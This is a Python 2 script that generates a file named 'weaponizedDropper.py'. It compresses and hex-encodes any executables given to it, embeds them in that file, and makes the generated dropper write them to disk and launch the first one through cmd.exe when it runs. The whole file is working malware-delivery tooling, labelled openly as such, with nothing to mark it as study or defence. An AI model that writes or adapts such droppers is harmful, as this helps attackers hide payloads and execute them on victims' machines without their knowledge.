#!/usr/bin/env python 

import zlib 
import sys, os
import re
from pathvalidate import sanitize_filename

def main(): 
	
	if len(sys.argv) < 2: 
		print "[!] Usage: compresser.py <executable file1> <file2> ... <filen>"
		return

	with open("weaponizedDropper.py", "wb+") as dropper: 

		dropper.write("""#!/usr/bin/env python

import zlib
import subprocess

def main():

	if len(FILENAMES) != len(HEXVALUES):
		return

	for i in xrange(len(FILENAMES)):
		with open(FILENAMES[i], "wb+") as f:
			f.write(zlib.decompress(HEXVALUES[i].decode("hex")))

	subprocess.call(["cmd.exe", "/c", "START "+ FILENAMES[0]])



""")

		filenames = []
		hexvalues = []

		for i in xrange(1, len(sys.argv)):
			print "[*] Compressing %s" % sys.argv[i]

			fileData = ""
			with open(sys.argv[i], "rb") as f: 

				fileData = f.read()

			compressedData = zlib.compress(fileData).encode("hex")

			filename = re.split(r"[\\/]+", sys.argv[i])[-1] + ".hex"

			with open(os.path.join("hexFiles", sanitize_filename(filename)), "wb+") as j: 
				j.write(compressedData)

			filenames.append(filename)
			hexvalues.append(compressedData)

		dropper.write("FILENAMES = [" + ",\n".join(['"' + i[:-4] + '"' for i in filenames]) + "]\n")
		dropper.write("HEXVALUES = [" + ",\n".join(['"' + i + '"' for i in hexvalues]) + "]\n\n")

		dropper.write("if __name__ == \"__main__\":\n\tmain()")



		

if __name__ == "__main__":
	main()